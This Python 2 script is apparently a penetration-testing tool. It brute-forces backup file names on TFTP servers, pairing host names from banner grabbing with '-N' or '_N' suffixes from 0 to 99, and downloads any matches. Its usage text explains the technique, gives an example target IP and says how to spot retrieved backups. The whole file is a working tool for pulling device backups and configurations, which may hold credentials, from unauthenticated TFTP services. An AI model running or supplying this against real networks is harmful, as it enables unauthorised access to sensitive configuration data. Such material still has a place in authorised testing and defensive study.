#!/usr/bin/env python
import argparse,sys

try :
	import tftpy
except :
	print '[!]Is tftpy installed ? Installation possible via pip : pip install tftpy. You can also download the zip folder at github : https://github.com/msoulier/tftpyand use the setup.py file to install : python setup.py install. '
	sys.exit('[!]Sudo must be used if not root.')

def look_backipF(host,name):
	for y in range(0,100):
		name0 = name + '-' + str(y)
		name1 = name + '_' + str(y)
		client_s = tftpy.TftpClient(host,69)
		try : 
			client_s.download(name0,name0)
		except: 
			print '[!]Download of '+name0+' failed.'
		try : 
			client_s.download(name1,name1)
		except:
			print '[!]Download of '+name1+' failed.'

def main_arguments() : 
	usage = 'In an internal network if there are tftp services on, the script is going\
 to check them for backup files of other hosts that have 21,22,23 services on. Often administrators\
 do back-ups using the TFTP service(ot they used to) appending to the name of the host to be backed-up a - or _ following\
 the number of the backup. For example : SSH_serverD_01. This program will try to download those back-up files using\
 the names the user specify that were previously obtained using the Get_Banners.py program. If the network in question\
 does not have any TFTP server on, this program does not have any use. The banner grabbing could give the user more than \
 the name of the server for this reason the user has to analyse what the name of the server could be and pass it the arguments. \
 The I.P of the TFTP server(s) should also be passed to arguments. I cannot tell if this program works or not with IPv6.'+'\n'+\
 "Example : "+sys.argv[0]+" -tftph 151.165.175.23 -names SSH_serverZ1 FTP_serverDebi2 "+'\n'+\
 "This script sould be run in a brand new created folder. It can be slowly due to its lack of multi-threading support, \
 . When it is done, use ls -l on the script's folder to check if there is a file that has more than 0 bytes, if there is one it is probably a back-up file. "
	epilog = 'My main concern is to protect people from detriment. Jean-Claude Juncker'
	parser = argparse.ArgumentParser(usage=usage,epilog=epilog)
	parser.add_argument('-tftph',dest='th',help='The host(s) that have TFTP service on.',nargs='+')
	parser.add_argument('-names',dest='n',help='The name(s) of the hosts banner.',nargs='+')
	arguments, unknown_arguments = parser.parse_known_args()
	if unknown_arguments :
		print 'Unknown arguments specified, details:'+ str(unknown_arguments)
		sys.exit()
	if arguments.th and arguments.n : 
		for host in arguments.th : 
			for name in arguments.n : 
				look_backipF(host,name)

main_arguments()
